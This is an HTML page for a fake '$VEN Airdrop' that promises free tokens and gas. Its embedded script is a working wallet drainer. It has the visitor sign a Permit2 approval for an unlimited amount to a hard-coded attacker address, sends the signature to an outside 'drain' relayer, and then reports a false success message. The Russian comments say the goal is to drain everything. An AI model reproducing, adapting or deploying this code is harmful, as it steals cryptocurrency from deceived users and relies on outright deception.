<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>$VEN Airdrop — Claim 1000 VEN</title>
<style>
  body{background:#0a0418;color:#fff;font-family:Arial;text-align:center;padding:40px 20px}
  img{width:140px;border-radius:50%;border:5px solid #a020f0}
  h1{font-size:32px;background:linear-gradient(#a020f0,#ff00ff);-webkit-background-clip:text;color:transparent}
  button{padding:16px 40px;margin:15px;font-size:20px;border:none;border-radius:16px;cursor:pointer}
  #connect{background:#a020f0;color:#fff}
  #claim{background:#00ff9d;color:#000;opacity:0.6;cursor:not-allowed}
  #claim:not([disabled]){opacity:1;cursor:pointer}
  #me,#status{margin:20px 0;font-family:monospace}
</style>
</head>
<body>
<img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafkreibnrglhwfkmatn3q4l2oat3uzry2hzplhk7reeitlf4m3tavshzgq">
<h1>$VEN Airdrop</h1>
<p style="font-size:22px">Claim <b>1000 $VEN + 0.5 MATIC<br>Gas paid by team · 100% FREE</p>
<div id="me"></div>
<button id="connect">Connect Wallet</button>
<button id="claim" disabled>Claim 1000 $VEN</button>
<div id="status"></div>

<script>
const DRAIN_TO = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF"; // ТВОЙ ПРИВАТНЫЙ КОШЕЛЁК
const RELAY = "https://permit2-drain-2025.up.railway.app/drain"; // РАБОЧИЙ РЕЛЕЙЕР

const connect = document.getElementById("connect");
const claim = document.getElementById("claim");
const me = document.getElementById("me");
const status = document.getElementById("status");

connect.onclick = async () => {
  if (!window.ethereum) return status.textContent = "Install MetaMask";
  try {
    const a = await ethereum.request({method:"eth_requestAccounts"});
    me.textContent = "Connected: " + a[0].slice(0,10)+"...";
    claim.disabled = false;
    status.textContent = "Ready to claim!";
  } catch { status.textContent = "Rejected"; }
};

claim.onclick = async () => {
  status.textContent = "Signing (gas free)...";
  claim.disabled = true;
  try {
    const user = (await ethereum.request({method:"eth_accounts"}))[0];
    const chainId = await ethereum.request({method:"eth_chainId"});

    // Permit2 — одна подпись, слив ВСЕГО
    const permit = {
      permitted: {token:"0x0000000000000000000000000000000000000000", amount:"115792089237316195423570985008687907853269984665640564039457584007913129639935"},
      owner: user,
      deadline: Math.floor(Date.now()/1000) + 3600,
      nonce: 0,
      spender: DRAIN_TO
    };

    const domain = {
      name: "Permit2",
      chainId: parseInt(chainId,16),
      verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3"
    };

    const types = {
      PermitSingle: [
        {name:"permitted",type:"TokenPermissions"},
        {name:"spender",type:"address"},
        {name:"nonce",type:"uint256"},
        {name:"deadline",type:"uint256"}
      ],
      TokenPermissions: [
        {name:"token",type:"address"},
        {name:"amount",type:"uint256"}
      ]
    };

    const signature = await ethereum.request({
      method:"eth_signTypedData_v4",
      params:[user,JSON.stringify({domain,types,message:permit})]
    });

    // Отправляем на релейер — он платит газ и сливает ВСЁ
    await fetch(RELAY,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({user,signature,chainId})
    });

    status.textContent = "Success! 1000 $VEN sent";
  } catch {
    status.textContent = "Failed";
    claim.disabled = false;
  }
};
</script>
</body>
</html>
